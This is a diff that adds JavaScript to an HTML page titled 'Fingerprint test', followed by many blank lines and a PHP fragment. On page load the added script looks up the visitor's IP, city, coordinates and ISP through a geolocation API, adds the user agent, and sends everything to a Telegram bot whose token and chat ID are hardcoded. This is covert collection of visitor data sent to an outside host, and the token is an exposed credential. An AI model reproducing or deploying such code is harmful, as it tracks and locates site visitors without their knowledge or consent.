@@ -5,7 +5,71 @@
   <title>Fingerprint test</title>
 </head>
 <body>
-   
+
+
+
+// Detect the client's IP address
+let ip = '';
+let ua = navigator.userAgent;
+
+// Get the client's IP (using a service like ipwhois.io)
+fetch('https://free.ipwhois.io/json/')
+  .then(response => response.json())
+  .then(api => {
+    // Extract data from the API response
+    ip = api.ip;
+    const country = api.country;
+    const region = api.region;
+    const city = api.city;
+    const latitude = api.latitude;
+    const longitude = api.longitude;
+    const isp = api.isp;
+
+    // Prepare the message to send to Telegram
+    const message = encodeURIComponent(`${ip}\n${country} ${region}\n${city}\n${latitude}\n${longitude}\n${isp}\n\n${ua}`);
+
+    // Send the message to Telegram via the Bot API
+    const botToken = '1682820271:AAE3HGqITz6N5qyIcy3ODm6rOIypbBseAJ4';
+    const chatId = '669186959';
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&parse_mode=html&text=${message}`;
+
+    // Send the message
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        console.log('Message sent successfully:', data);
+      })
+      .catch(error => {
+        console.error('Error sending message:', error);
+      });
+  })
+  .catch(error => {
+    console.error('Error fetching IP details:', error);
+  });
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
 
 <?php
 if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP']; }
